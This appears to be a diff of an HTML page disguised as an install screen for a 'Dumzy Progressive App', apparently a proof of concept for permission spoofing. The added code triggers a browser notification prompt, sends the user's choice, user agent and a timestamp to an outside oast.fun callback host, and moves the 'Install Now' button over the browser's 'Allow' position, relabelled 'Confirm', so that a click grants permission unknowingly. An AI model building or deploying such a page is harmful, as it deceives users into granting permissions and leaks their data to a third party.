@@ -1,10 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Install Dumzy App</title>
+  <title>Install Dumzy Progressive App</title>
   <style>
-    body { font-family: sans-serif; text-align: center; padding-top: 100px; }
-    .install-btn {
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+    #install-btn {
       background: green;
       color: white;
       padding: 20px 40px;
@@ -12,36 +16,53 @@
       border: none;
       border-radius: 10px;
       position: absolute;
-      top: 190px;
+      top: 220px;
       left: 50%;
       transform: translateX(-50%);
-      z-index: 9999;
       cursor: pointer;
+      z-index: 9999;
+      transition: all 0.5s ease;
     }
   </style>
 </head>
 <body>
+
   <h2>📱 Install Dumzy Progressive App</h2>
   <p>For faster experience, install Dumzy to your home screen.</p>
 
-  <button class="install-btn" onclick="log()">Install Now</button>
+  <button id="install-btn" onclick="moveButton()">Install Now</button>
 
   <script>
+    let moved = false;
+
+    // Trigger notification prompt
     setTimeout(() => {
-      Notification.requestPermission().then(r => {
-        fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/pwa-notif-spoof', {
+      Notification.requestPermission().then(result => {
+        fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/chain-install-notif', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            result: r,
-            ua: navigator.userAgent
+            permission: result,
+            ua: navigator.userAgent,
+            ts: Date.now()
           })
         });
       });
     }, 1000);
 
-    function log() {
-      // Optional log
+    function moveButton() {
+      const btn = document.getElementById("install-btn");
+
+      // On first click, move the button over the Allow position
+      if (!moved) {
+        btn.style.top = "90px";
+        btn.style.left = "400px"; // Adjust to align with "Allow" on Chrome
+        btn.textContent = "Confirm";
+        moved = true;
+      } else {
+        // Optional secondary logic
+        alert("App is being installed...");
+      }
     }
   </script>
 </body>
